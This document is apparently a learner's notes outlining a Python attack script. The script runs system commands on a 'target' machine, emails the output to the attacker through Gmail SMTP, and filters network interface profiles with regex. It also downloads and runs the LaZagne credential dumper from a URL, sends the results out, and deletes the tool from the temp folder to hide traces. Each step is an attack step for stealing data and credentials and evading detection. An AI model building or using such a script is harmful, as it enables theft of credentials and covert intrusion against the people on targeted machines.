* Sys-Commands Script 
 
 .1) Execute "System Commands" on target . 
  - Windows commands .
  - IOS "Unix" commands . 

 * Execute command using supprocess.Popen function .
   + Popen("COMMAND", shell=True) | VARIABLE=check_ouput(COMMAND, shell=True). 
   + Process open function will exeucte the command or start a new process from the python script and continue to execute the rest of the program without need to wait the command to finsh execution . 
   + Check Ouput function will execut a command and return it's result without need to set stdout=True . 
   
  

 .2) Send command results to Attacker via Email . 
     + By create instance of SMTP server to be able to send result via email . 
     + Using (smtp.gmail.com) google SMTP server and specify port for it . 
     + Iniate TLS connection using SERVER instance . 
     + Login to our email, to be able to send emails . 
     + Send the email . 
     + Close SERVER instance . 

 * Send result using smtplib python library .  
   + SERVER=smtplib.SMTP("SMTP-URL", PORT) . 
   + SERVER.starttls() 
   + SERVER.login(user=USERNAME, password=PASSWORD)
   + SERVER.sendemail(from_addr=, to_addrs=, msg=)
   + SERVER.quit() 

 * Develop the script to check which network interface used on the target system and check it's type : 
 
 .3) Using regex to filter out network cards names : 
   + Using re.findall() function to find all network profiles names to make the script more useful . 
   + re.findall() return the result as list which make it easier to search on the NIC's names . 
   + re.findall(pattern="", string="")
   + Then will pass the result of the re to the command . 

 .4) Combine all the result to send it using one email and that email contain all the values of the command : 
   + Using variable out the loop and store all the result of each Network Card Profile . 
   + This send the final Email . 

 .5) Use requests library to install softwares on the target-machine (laZagne.exe) : 
   + Get_Request_Result=request.get(url=URL)
   + Write the content of the  Get_Request_Result to a file, but ensure the new file have required extision . 
   + Execute the program and send its result to attacker-machine . 

 .6) Install the software on temp-folder then delete it after finshing : 
   + using tempfile library to locate temp-folder on target-machine . 
   + Tmp-Folder = tempfile.gettempdir(), store temp-folder location into variable . 
   + Move to temp-folder os.chdir(DstPath) )then install the software in it then ; 
   + Delete the software using os.remove(FilePath) to delete any tracks .
